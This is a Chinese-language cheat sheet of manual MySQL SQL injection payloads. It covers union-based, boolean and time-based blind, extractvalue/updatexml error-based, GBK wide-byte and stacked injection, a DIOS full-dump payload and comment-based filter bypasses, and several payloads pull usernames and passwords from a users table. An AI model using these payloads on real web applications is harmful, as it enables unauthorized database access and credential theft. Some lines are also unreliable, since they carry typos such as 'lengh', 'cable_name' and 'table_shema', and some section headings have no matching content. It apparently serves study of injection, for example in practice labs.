# sql手工注入命令

## information_schema 结构

**一般主要用到的有information_schema中的tables表和columns表**
**用法：information_schema.tables **  **
**information_schema.tables 下有 table_schema 和table_name  这两个重要列名

* **table_schema 数据库名**
* **table_name  表名**

**知道数据库名称之后要查看底下有哪些表可以采用 **`union select group_concat(table_name) from information_schema.tables where table_schema ="数据库名" -- +`
**查看某个表里有哪些东西：**`union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名' and table_schema='数据库名'-- +`
**注意，我们要查的是指定数据库的指定表，而如果不指定数据库的话其他数据库中同名表中的列也会被显示出来**
**爆列中的数据** `'union select 1,2,group_concat(username," : ",password) from users -- +`

## 常用的函数

**group_contact() ：将多个查询到的数据拼接后形成字符串输出**

**注意：sql注入候需要用到的闭合方式不一定，具体要看后台代码。主要有** `' "  ')  ")`这几种

## 基本的回显注入爆库语句：

**有回显的时候一般采用联合查询的方式进行注入，可以将查到的信息返回到页面上**

```
order by 4 -- +
union select 1,2,3,4 -- +                
union select 1,database(),user() -- +     查看数据库名和当前用户
UNION SELECT 1,2,@@version -- -           
UNION SELECT 1,2,version() -- -
union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='库名'--+
union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名' and table_schema='库名' -- +
```

## 盲注

**页面上不回显我们查询的信息，这时用union select注入就不行了，因为联合注入需要有回显位**

### 基于布尔型的盲注

**布尔盲注主要用到length(),ascii() ,substr()这三个函数，首先通过length()函数确定长度再通过另外两个确定具体字符是什么。布尔盲注向对于联合注入来说需要花费大量时间。**
**length(): 返回内容的长度**
**ascii(str):返回最左侧字符的ascii值**
**substr(obj，start，length)： **

* **obj：从哪个内容中截取，可以是数值或字符串。**
* **start：从哪个字符开始截取（1开始，而不是0开始）**
* **length：截取几个字符（空格也算一个字符）。**

```
and length(database())>9--+   查看数据库名的长度范围
s                   看数据库名称的第一个字符的ascii是不是

and ascii(substr((database()),1,1))=115--+              看数据库名称的第一个字符的ascii是不是115

以上面两个为一组 之后就将 'database' 的部分换成各个回显型查询的"selcet ...."  部分 一个一个的去试

```

### 时间类型的盲注

**当页面连正确错误都不给你回显的时候，布尔形的盲注效果就不是很好，可以加上一些时间判断变成时间性盲注来判断**
**基于时间的注入会用到sleep()函数，通过页面返回的间隔时间确定输入的是不是正确的。**
**if(a,sleep(10),1)如果a结果是真的，那么执行sleep(10)页面延迟10秒，如果a的结果是假，执行1，页面不延迟**

```
and if(1=1,sleep(5),1)--+   查看是否存在盲注，如果存在的话页面会延迟5秒刷新，（当正确闭合的时候会有5秒延迟）
之后吧1=1 换成基于布尔类型的判断就行了

and if(length(database())>9,sleep(5),1)--+           查看数据库名长度是不是>9
and if(substr((database()),1,1)='a',sleep(5),1)--+   查看数据库名称的第一个字段是不是a

```

**整个时间盲注结合起来就像这样：**

```

and if(lengh(select group_concat(table_name) from information_schema.tables where table_schema='库名')>=15,sleep(5),1) -- +              查看库中表的集合字符串的长度

and if(substr(select group_concat(table_name) from information_schema.tables where table_schema='库名'),1,1)='a',sleep(5),1)--+           查看库中表的集合字符串第一个字符是不是a
```

## Mysql 报错注入

**没有显示位的时候可以，但是前提是php代码中要用到回显mysql_error()信息。**
**报错注入的原理是用一些函数在内容格式有错误的时候产生的报错会解析查询语句，如返回时将** `database()`显示为数据库名 ，`user()` 返回为用户名这样

**报错注入一般常用的有floor()报错注入，extractvalue()报错注入，updatexml()报错注入和group by()报错注入。**

**extractvalue()报错注入**：**
**extractvalue($**1,**$**2)  其中**$**1是字符串，**$**2 是xpath语句，当xpath语句有错误的时候，就会产生报错，可以利用这点构造语句进行注入并且回显信息，语句就是回显注入的查询语句**

`select extractvalue(1,concat(1,2,'#',(select group_concat(cable_name) from information_schema.tables where table_schema='security')));`

**updatexml报错注入**

**UPDATEXML (XML_document, XPath_string, new_value)**
**第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc**
**第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。**
**第三个参数：new_value，String格式，替换查找到的符合条件的数据**
**作用：改变文档中符合条件的节点的值，改变XML_document中符合XPATH_string的值**
**当我们XPath_string语法报错时候就会报错，updatexml()报错注入和extractvalue()报错注入基本差不多。**

```
123' and select updatexml(1,concat(0x5c,version(),0x5c),1)#     爆版本
123' and select updatexml(1,concat(0x5c,database(),0x5c),1)#    爆数据库

 1') and updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)#

123') updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x5c),1)#      爆表名
123' and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='users'),0x5c),1))#
   爆字段名

123' and (updatexml(1,concat(0x5c,(select password from (select password from users where username='admin1') b),0x5c),1))#
爆密码该格式针对mysql数据库。

爆其他表就可以，下面是爆emails表

123' and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='emails'),0x5c),1))#

1' and (updatexml (1,concat(0x5c,(select group_concat(id,email_id) from emails),0x5c),1))#   爆字段内容。
```

**group by报错注入**
**group by 报错注入相较于上面的两种报错注入而言相对复杂一些，主要由于** `floor(rand(0)*2` 和 `group by` 一同使用时候会出现主键重复的情况而产生报错从而带出想要的信息

**宽字节注入**

**原理：当使用转义符号‘\’处理单引号和双引号的时候，如果可以识别是gbk编码（将两个字节合成一个汉字）的话，就可以在单引号前面加上  %81这样的内容，在url传输中，'**\**' 会采用url编码，形成%5c    ”%81%5c“ 会被解释为一个中文字符，从而实现单引号的闭合。打个比方：  id='%81**\**'   -->    id='乗'   主要是干掉了‘\’**

**注入条件：**

* **数据库使用了GBK编码；**
* **使用了addslashes()、mysql_real_escape_string()、 mysql_escape_string() 这样的转义函数会把单引号转义为特殊字符（前面加\ ）**
  **如何判断是不是使用了转义：只能用手动去试试 **

  ```
  -1%81' union select 1,2,3  -- +

  ```

  **但是这时又会出现一个问题： **
  `union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='manber'--+`

  **manber 两边的单引号或者双引号也会被注释掉造成无法查询；这时候要用unicode编码或者使用十六进制编码进行绕过，数据库是能识别出这些编码的信息的**

**二次注入**

**堆叠注入**

```
union select 'a',group_concat(table_name),'c' from information_schema.tables where table_schema = database()#

union select 'a',group_concat(table_name),'c' from information_schema.tables where table_shema = database()#

```

## DIOS (一次性转储载荷)

**dios 是一个精心设计的有效载荷，它将转储数据库（），表（）和列 （） 并将其显示在网站上**

```
' UNION SELECT 1,CONCAT('>', VERSION(), (SELECT @ FROM (SELECT @:=0x00, (SELECT 0 FROM information_schema.columns WHERE table_schema=DATABASE() AND 0x00 IN (@:=CONCAT(@, 0x3c62723e, table_name, 0x3a3a, column_name)))) x)), 3 -- +
```

## sql简单绕过：

**利用大小写加注释符号进行绕过**

```
'/*!UnIon/*trick-comment*/*/ sElect 1,2,3,4,5,6 -- -
#其中`/*！`  和 `*/` 是mysql的注释，只在特定版本的mysql中才有用 实际上执行的查询是 "SELECT 1,2,3,4,5,6


'/*!Union/*AmitTheNoob*/*/ select 1,2,3,table_name,5,6 from information_schema.tables where table_schema=database()-- -
```
